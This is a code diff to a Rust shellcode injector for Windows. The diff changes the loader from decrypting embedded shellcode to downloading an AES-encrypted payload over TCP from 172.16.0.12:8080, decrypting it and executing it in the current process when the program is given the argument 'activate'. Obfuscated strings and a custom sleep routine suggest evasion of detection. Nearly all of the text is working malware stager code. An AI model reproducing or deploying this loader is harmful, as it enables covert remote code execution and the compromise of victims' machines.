@@ -1,12 +1,16 @@
 use std::env;
-use aes::{Aes128};
-use cfb_mode::Cfb;
-use cfb_mode::cipher::{NewCipher, AsyncStreamCipher};
+use std::net::TcpStream;
+use std::net::SocketAddr;
+use std::io::Read;
+
+use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
+
+use socket2::{Domain, Socket, Type};
 use windows::{Win32::System::Memory::*, Win32::System::SystemServices::*};
 use ntapi::{ntmmapi::*, ntpsapi::*, ntobapi::*, winapi::ctypes::*};
 use obfstr::obfstr;
 
-type Aes128Cfb = Cfb<Aes128>;
+type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;
 
 pub struct Injector {
     shellcode: Vec<u8>,
@@ -56,21 +60,35 @@ impl Injector {
     }
 }
 
-const SHELLCODE_BYTES: &[u8] = include_bytes!("../shellcode.enc");
-const SHELLCODE_LENGTH: usize = SHELLCODE_BYTES.len();
+//const SHELLCODE_BYTES: &[u8] = include_bytes!("../shellcode.enc");
+//const SHELLCODE_LENGTH: usize = SHELLCODE_BYTES.len();
 
 #[no_mangle]
 #[link_section = ".text"]
-static SHELLCODE: [u8; SHELLCODE_LENGTH] = *include_bytes!("../shellcode.enc");
+//static SHELLCODE: [u8; SHELLCODE_LENGTH] = *include_bytes!("../shellcode.enc");
 static AES_KEY: [u8; 16] = *include_bytes!("../aes.key");
 static AES_IV: [u8; 16] = *include_bytes!("../aes.iv");
 
-fn decrypt_shellcode_stub() -> Vec<u8> {
-    let mut cipher = Aes128Cfb::new_from_slices(&AES_KEY, &AES_IV).unwrap();
-    let mut buf = SHELLCODE.to_vec();
-    cipher.decrypt(&mut buf);
-    buf
-}
+fn download_shellcode() -> Vec<u8> {
+    let socket = Socket::new(Domain::IPV4, Type::STREAM, None).expect("failed to open socket");
+    let server_address = "172.16.0.12:8080".parse::<SocketAddr>().expect("failed to set socketaddr");
+ 
+    socket.connect(&server_address.into()).expect("failed to connect to socket");
+ 
+    let mut data = [0; 2048];
+    let mut stream = TcpStream::from(socket);
+    let response_size = stream.read(&mut data).expect("failed to get response size");
+ 
+    return data[..response_size].to_vec()
+ }
+
+
+fn decrypt_shellcode() -> Vec<u8> {
+    let mut enc_shellcode = download_shellcode();
+    let dec_shellcode = Aes128CbcDec::new(&AES_KEY.into(), &AES_IV.into()).decrypt_padded_mut::<Pkcs7>(&mut enc_shellcode).expect("failed to decrypt shellcode");
+
+    return dec_shellcode.to_vec()
+}   
 
 fn custom_sleep(delay: u8) {
     for _ in 0..delay {
@@ -87,7 +105,7 @@ fn custom_sleep(delay: u8) {
 fn main() {
     let args: Vec<String> = env::args().collect();
     if args[1] == obfstr!("activate") {
-        let mut injector = Injector::new(decrypt_shellcode_stub());
+        let mut injector = Injector::new(decrypt_shellcode());
         injector.run_in_current_process();
     }
 }
